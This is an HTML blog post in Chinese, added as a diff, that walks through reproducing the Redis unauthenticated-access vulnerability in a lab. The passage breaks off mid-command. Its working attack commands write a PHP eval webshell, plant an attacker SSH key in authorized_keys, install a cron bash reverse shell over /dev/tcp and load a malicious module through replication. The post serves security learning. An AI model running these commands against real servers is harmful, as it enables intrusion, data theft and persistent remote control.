@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"baicany.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="普遍的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redis未授权访问漏洞复现">
+<meta property="og:url" content="https://baicany.github.io/2023/06/11/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="baicany">
+<meta property="og:description" content="普遍的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://baicany.github.io/images/s2.png">
+<meta property="article:published_time" content="2023-06-11T14:16:01.000Z">
+<meta property="article:modified_time" content="2023-06-21T14:31:50.212Z">
+<meta property="article:author" content="baicany">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://baicany.github.io/images/s2.png">
+
+
+<link rel="canonical" href="https://baicany.github.io/2023/06/11/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%94%BB%E5%87%BB/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":"","permalink":"https://baicany.github.io/2023/06/11/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%94%BB%E5%87%BB/","path":"2023/06/11/redis未授权攻击/","title":"redis未授权访问漏洞复现"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>redis未授权访问漏洞复现 | baicany</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">baicany</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome my world !</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">攻击复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%85%A5webshell"><span class="nav-number">2.2.1.</span> <span class="nav-text">写入webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%85%A5ssh%E5%85%AC%E9%92%A5"><span class="nav-number">2.2.2.</span> <span class="nav-text">写入ssh公钥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.2.3.</span> <span class="nav-text">定时任务,反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="nav-number">2.2.4.</span> <span class="nav-text">redis主从复制</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">3.</span> <span class="nav-text">防御措施</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="baicany"
+      src="/images/head.jpg">
+  <p class="site-author-name" itemprop="name">baicany</p>
+  <div class="site-description" itemprop="description">web小菜狗一枚</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  <div class="post-gallery" itemscope itemtype="http://schema.org/ImageGallery">
+    
+    <div class="post-gallery-image">
+      <img src="https://baicany.github.io/images/s2.png" itemprop="contentUrl">
+    </div>
+    </div>
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://baicany.github.io/2023/06/11/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="baicany">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="baicany">
+      <meta itemprop="description" content="web小菜狗一枚">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="redis未授权访问漏洞复现 | baicany">
+      <meta itemprop="description" content="普遍的">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          redis未授权访问漏洞复现
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-06-11 22:16:01" itemprop="dateCreated datePublished" datetime="2023-06-11T22:16:01+08:00">2023-06-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-06-21 22:31:50" itemprop="dateModified" datetime="2023-06-21T22:31:50+08:00">2023-06-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">学习记录</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">普遍的</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>Redis安装后，默认情况下，会绑定在 <code>0.0.0.0:6379</code>，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的<code>config</code> 命令，可以进行写文件操作，攻击者可以成功将自己的<code>ssh公钥</code>写入目标服务器的 <code>/root/.ssh</code> 文件夹的<code>authotrized_keys</code>文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
+<p>(在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错)</p>
+<p>漏洞的产生条件有以下两点:</p>
+<p>(1)  Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网</p>
+<p>(2)  没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务</p>
+<p><strong>漏洞影响版本</strong></p>
+<p>Redis 2.x，3.x，4.x，5.x</p>
+<p><strong>漏洞危害</strong></p>
+<p>(1) 攻击者无需认证访问到内部数据,可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据</p>
+<p>(2) 攻击者可通过eval执行lua代码，或通过数据备份功能往磁盘写入后门文件</p>
+<p>(3) 如果redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器 </p>
+<h1 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机: kali 2023.1</p>
+<p>靶机: ubuntu 22.04.2</p>
+<p>靶机安装redis服务器(redis-server)</p>
+<ol>
+<li><p>下载redis-4.0.10</p>
+<p><code>wget http://download.redis.io/releases/redis-4.0.10.tar.gz</code></p>
+</li>
+<li><p>解压，进入源码目录，然后编译(make、make install)</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">tar</span> -zxf redis-<span class="number">4</span>.<span class="number">0</span>.<span class="number">10</span>.tar.gz</span><br><span class="line"><span class="attribute">cd</span> redis-<span class="number">4</span>.<span class="number">0</span>.<span class="number">10</span></span><br><span class="line"><span class="attribute">make</span></span><br><span class="line"><span class="attribute">make</span> install</span><br></pre></td></tr></table></figure>
+
+<p>我这里make出现了错误,缺少gcc</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> src &amp;&amp; <span class="keyword">make</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: Entering directory <span class="string">&#x27;/home/ubuntu/redis-4.0.11/src&#x27;</span></span><br><span class="line">    CC adlist.<span class="keyword">o</span></span><br><span class="line">/bin/<span class="keyword">sh</span>: <span class="number">1</span>: <span class="keyword">cc</span>: not found</span><br><span class="line">Makefile:<span class="number">228</span>: recipe <span class="keyword">for</span> target <span class="string">&#x27;adlist.o&#x27;</span> failed</span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: *** [adlist.<span class="keyword">o</span>] Error <span class="number">127</span></span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: Leaving directory <span class="string">&#x27;/home/ubuntu/redis-4.0.11/src&#x27;</span></span><br><span class="line">Makefile:<span class="number">6</span>: recipe <span class="keyword">for</span> target <span class="string">&#x27;all&#x27;</span> failed</span><br><span class="line"><span class="keyword">make</span>: *** [<span class="keyword">all</span>] Error <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>apt install gcc</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> src &amp;&amp; <span class="keyword">make</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: Entering directory <span class="string">&#x27;/home/ubuntu/redis-4.0.11/src&#x27;</span></span><br><span class="line">    CC adlist.<span class="keyword">o</span></span><br><span class="line">In <span class="keyword">file</span> included from adlist.<span class="keyword">c</span>:<span class="number">34</span>:<span class="number">0</span>:</span><br><span class="line">zmalloc.h:<span class="number">50</span>:<span class="number">10</span>: fatal error: jemalloc/jemalloc.h: No such <span class="keyword">file</span> <span class="built_in">or</span> directory</span><br><span class="line"> #include &lt;jemalloc/jemalloc.h&gt;</span><br><span class="line">          ^~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br><span class="line">Makefile:<span class="number">228</span>: recipe <span class="keyword">for</span> target <span class="string">&#x27;adlist.o&#x27;</span> failed</span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: *** [adlist.<span class="keyword">o</span>] Error <span class="number">1</span></span><br><span class="line"><span class="keyword">make</span>[<span class="number">1</span>]: Leaving directory <span class="string">&#x27;/home/ubuntu/redis-4.0.11/src&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以通过 mkae MALLOC&#x3D;libc</p>
+<p>需要修改配置文件redis.conf</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bind</span> <span class="number">0.0.0.0</span></span><br><span class="line">protected-mode <span class="literal">no</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>启动服务(redis-server)<br>启动redis服务，注意关闭防火墙，Ubuntu除了iptables机制，还有ufw安全机制</p>
+<p><code>ufw staus</code>看是否关闭<br>启动服务</p>
+<p><img src="https://baicany.github.io/images/1592114-20191012203213483-1785541353.png" alt="img"></p>
+</li>
+</ol>
+<p>kali安装redis</p>
+<ol>
+<li><p>下载redis-4.0.10(跟上面一样)&#x2F;&#x2F;但是我用的2.8</p>
+</li>
+<li><p>解压,编译(跟什么一样)</p>
+</li>
+<li><p>测试是否能连接<br><img src="https://baicany.github.io/images/1592114-20191012203316598-1153965360.png" alt="img"></p>
+</li>
+</ol>
+<p>​		这里连接后发现输入info报错</p>
+<p><img src="https://baicany.github.io/images/image-20230608110721420.png" alt="image-20230608110721420"></p>
+<p>​	还是因为protected-mode原因在靶机再开一个虚拟终端</p>
+   <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@ubuntu</span><span class="symbol">:/data/redis-</span><span class="number">4.0</span>.<span class="number">6</span><span class="comment"># ./src/redis-cli</span></span><br><span class="line"><span class="meta prompt_">127.0.0.1:6379&gt;</span> <span class="variable constant_">CONFIG</span> <span class="variable constant_">SET</span> <span class="keyword">protected</span>-mode no</span><br><span class="line"><span class="variable constant_">OK</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>测试目标靶机是否存在未授权访问</p>
+<p><img src="https://baicany.github.io/images/image-20230608112133014.png" alt="image-20230608112133014"></p>
+<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>利用条件:目标开启了web服务器,并且知道web路径(可以利用phpinfo或者错误暴路径等)，还需要具有读写增删改查权限</p>
+<p><img src="https://baicany.github.io/images/1592114-20191012203436012-1515179378.png" alt="img"></p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config <span class="keyword">get</span> dir </span><br><span class="line">config <span class="keyword">set</span> dir <span class="regexp">/var/</span>www<span class="regexp">/html/</span></span><br><span class="line">config <span class="keyword">set</span> dbfilename shell.php</span><br><span class="line"><span class="keyword">set</span> shell <span class="string">&quot;<span class="subst">\r</span><span class="subst">\n</span><span class="subst">\r</span><span class="subst">\n</span>&lt;?php phpinfo();?&gt;<span class="subst">\r</span><span class="subst">\n</span><span class="subst">\r</span><span class="subst">\n</span>&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>在写入webshell的时候，可以使用：<code>\r\n</code>来换行，有些redis版本写文件会自带一些版本文件，可能导致无法解析。</p>
+<p>当数据库过大时，redis写shell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;bmjoker.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;&lt;?php @eval($_POST[\&quot;bmjoker\&quot;]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到靶机是否写入文件</p>
+<h3 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h3><p>SSH提供两种登录验证方式：一种是口令验证也就是账号密码登录，另一种是密钥验证，这里只简单说一下密钥验证的原理。</p>
+<p>所谓密钥验证，其实就是一种基于公钥密码的认证，使用公钥加密、私钥解密，其中公钥是公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密，大体过程如下：</p>
+<blockquote>
+<p>（1）客户端生成私钥和公钥，并把公钥拷贝给服务器端；</p>
+<p>（2）客户端发起公钥认证请求，发送自己的相关信息；</p>
+<p>（3）服务器端根据客户端发来的信息查找是否存有该客户端的公钥，若没有拒绝登录；若有则使用该公钥对一个随机的256位的字符串进行加密，并发送给客户端；</p>
+<p>（4）客户端收到服务器发来的加密后的消息后使用私钥解密，并生成一个MD5值发送给服务器端；</p>
+<p>（5）服务器端根据原始随机字符串生成MD5值进行匹配, 确认客户端身份，若一样则允许登录，不一样则拒绝登录。</p>
+</blockquote>
+<p>原理就是在数据库中插入一条数据，将本机的公钥作为value,key值随意，然后通过修改数据库的默认路径为&#x2F;root&#x2F;.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的&#x2F;root&#x2F;.ssh下生一个授权的key。</p>
+<ol>
+<li><p>在攻击机上生成ssh公钥,密码设置为空 为空就是在生成公钥和私钥的过程中回车即可</p>
+<p><img src="https://baicany.github.io/images/image-20230608123359005.png" alt="image-20230608123359005"></p>
+</li>
+<li><p>进入&#x2F;root&#x2F;.ssh将公钥写入key.txt文件（前后用\n换行，避免和redis里其他缓存数据混合）。<br><img src="https://baicany.github.io/images/image-20230608123445546.png" alt="image-20230608123445546"></p>
+</li>
+</ol>
+<p>​	(echo -e “\n”;cat id_rsa.pub;echo -e “\n”)&gt;key.txt</p>
+<ol start="3">
+<li><p>再把key.txt文件内容写入redis缓冲</p>
+<p>cat &#x2F;root&#x2F;.ssh&#x2F;key.txt |.&#x2F;redis-cli -h 192.168.10.139 -x set pub</p>
+<p><img src="https://baicany.github.io/images/image-20230608123555517.png" alt="image-20230608123555517"></p>
+</li>
+<li><p>设置redis的dump文件路径为&#x2F;root&#x2F;.ssh且文件名为authorized_keys,<br>注意: redis 可以创建文件但无法创建目录，所以，redis 待写入文件所在的目录必须事先存在。出现如下图错误是因为目标靶机不存在.ssh目录(默认没有,需要生成公、私钥或者建立ssh连接时才会生成)<br><strong><img src="https://baicany.github.io/images/image-20230608123815826.png" alt="image-20230608123815826"></strong></p>
+</li>
+</ol>
+<p>注: 在靶机中需要开启ssh服务才行，在靶机中输入systemctl start sshd,开启ssh服务<br>        如果没有就apt install openssh-server就行了</p>
+<ol start="5">
+<li>然后测试是否能连接<br><img src="https://baicany.github.io/images/image-20230608124200078.png" alt="image-20230608124200078"></li>
+</ol>
+<p>出现现在这个界面就进入靶机了,输入命令将是靶机的内容了</p>
+<h3 id="定时任务-反弹shell"><a href="#定时任务-反弹shell" class="headerlink" title="定时任务,反弹shell"></a>定时任务,反弹shell</h3><ol>
+<li><p>在攻击机开启监听<br><code>nc -lnvp 1234</code></p>
+</li>
+<li><p>连接redis服务器，写入反弹shell。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SET</span> xxx <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.26.120/1234 0&gt;&amp;1\n\n&quot;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">CONFIG </span><span class="built_in">SET</span> dir /var/spool/cron<span class="built_in"></span></span><br><span class="line"><span class="built_in">CONFIG </span><span class="built_in">SET</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>这个复现了很长时间o(╥﹏╥)o,配环境,</p>
+<p>登陆ubuntu查看计划任务，已经成功写入。但是发现计划中存在乱码，也就是这些乱码导致计划任务执行错误。<br>这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向&#x2F;etc&#x2F;cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据。</p>
+<p>动把乱码删除，发现依然无法成功反弹shell。这是为什么呢？</p>
+<p>根据网上搜到改后配置后,连接成功</p>
+<h3 id="redis主从复制"><a href="#redis主从复制" class="headerlink" title="redis主从复制"></a>redis主从复制</h3><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机(master)，其他实例都作为备份机(slave)，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+<p>redis模块</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在Reids <span class="number">4</span>.<span class="keyword">x</span>之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写<span class="keyword">c</span>语言并编译出.so文件。编写恶意so文件的代码</span><br></pre></td></tr></table></figure>
+
+<p>利用原理</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载<span class="keyword">so</span>文件，我们就可以执行拓展的新命令了。很多主从复制导致任意命令执行都是通过Redis的未授权访问漏洞导致了横向移动攻击方式的发生。</span><br></pre></td></tr></table></figure>
+
+<p>复现kali靶机就行:</p>
+<ol>
+<li><p>下载恶意os文件</p>
+<p><code>git clone https://github.com/RicterZ/RedisModules-ExecuteCommand</code></p>
+<p>然后编译源码make,</p>
+</li>
+<li><p>下载工具getshell</p>
+<p><code>git clone https://github.com/Ridter/redis-rce</code></p>
+<p>将第一步的module.so反正攻击目录下</p>
+</li>
+<li><p>第三步直接用脚本<br><code>python redis-rce.py -r 127.0.0.1 -p 6307 -L 127.0.0.1 -f module.so</code><br><img src="https://baicany.github.io/images/image-20230612165455249.png" alt="image-20230612165455249"></p>
+<p>按i进入交互式输入命令就行，重要是理解原理</p>
+<p><strong>Redis主从复制手动挡</strong></p>
+<p>1.使用脚本，监听本地端口1234，加载exp.so。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> RogueServer.<span class="keyword">py</span> --lport <span class="number">1234</span> --<span class="built_in">exp</span> <span class="built_in">exp</span>.<span class="keyword">so</span></span><br></pre></td></tr></table></figure>
+
+<p>2、通过未授权访问连入要攻击的redis服务器。</p>
+<p>执行相关命令：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置redis的备份路径为当前目录</span></span><br><span class="line">    config <span class="built_in">set</span> dir ./</span><br><span class="line"><span class="comment">#设置备份文件名为exp.so，默认为dump.rdb</span></span><br><span class="line">    config <span class="built_in">set</span> dbfilename <span class="built_in">exp</span>.so</span><br><span class="line"><span class="comment">#设置主服务器IP和端口</span></span><br><span class="line">    slaveof <span class="number">192.168</span><span class="number">.172</span><span class="number">.129</span> <span class="number">1234</span>  </span><br><span class="line"><span class="comment">#加载恶意模块</span></span><br><span class="line">    module <span class="built_in">load</span> ./<span class="built_in">exp</span>.so</span><br><span class="line"><span 